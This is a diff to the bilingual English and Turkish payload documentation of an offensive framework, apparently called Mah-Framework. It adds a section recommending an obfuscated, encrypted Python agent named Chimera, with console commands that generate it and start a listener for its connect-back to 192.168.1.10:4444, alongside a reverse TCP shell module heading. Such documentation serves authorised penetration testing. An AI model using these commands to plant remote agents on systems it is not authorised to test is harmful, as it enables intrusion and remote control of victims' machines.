@@ -9,6 +9,28 @@
 
 Mah-Framework payload modules are used to execute commands or establish connections on target systems. This document details all available payload types and their usage.
 
+> Related docs: [Chimera User Guide](CHIMERA_USER_GUIDE.md) · [Modules Catalog](MODULES.md) · [Quick Start](QUICKSTART.md)
+
+### 🐉 Chimera (Recommended Agent)
+
+Next-generation encrypted Python agent (AES-256-GCM + ECDH).
+
+```bash
+use payloads/python/chimera/generate
+set LHOST 192.168.1.10
+set LPORT 4444
+set OBFUSCATE true
+run
+
+use exploit/multi/handler
+set PAYLOAD payloads/python/chimera/generate
+set LHOST 192.168.1.10
+set LPORT 4444
+run
+```
+
+Full guide: [CHIMERA_USER_GUIDE.md](CHIMERA_USER_GUIDE.md) · Session commands: [CHIMERA_COMMANDS_USAGE.md](CHIMERA_COMMANDS_USAGE.md)
+
 ### 🐍 Python Payloads
 
 #### 1. `python/shell_reverse_tcp`
@@ -127,6 +149,20 @@ Once a payload executes on the target and connects back to your listener, a new 
 
 Mah-Framework bünyesinde bulunan payload modülleri, hedef sistemlerde komut çalıştırma veya bağlantı sağlama amacıyla kullanılır. Bu belge, mevcut tüm payload türlerini ve kullanım detaylarını içerir.
 
+> İlgili belgeler: [Chimera Kullanım Rehberi](CHIMERA_USER_GUIDE.md) · [Modül Kataloğu](MODULES.md) · [Hızlı Başlangıç](QUICKSTART.md)
+
+### 🐉 Chimera (Önerilen Ajan)
+
+Yeni nesil şifreli Python ajan (AES-256-GCM + ECDH). Detay: [CHIMERA_USER_GUIDE.md](CHIMERA_USER_GUIDE.md) · Oturum komutları: [CHIMERA_COMMANDS_USAGE.md](CHIMERA_COMMANDS_USAGE.md)
+
+```bash
+use payloads/python/chimera/generate
+set LHOST 192.168.1.10
+set LPORT 4444
+set OBFUSCATE true
+run
+```
+
 ### 🐍 Python Payload'ları
 
 #### 1. `python/shell_reverse_tcp`
@@ -235,4 +271,4 @@ Bir payload hedef sistemde çalışıp dinleyicinize bağlandığında, yeni bir
     sessions -k <session_id>
     ```
 
-*Dokümantasyon son güncelleme tarihi: 2026-02-09*
+*Dokümantasyon son güncelleme tarihi: 2026-07-31*
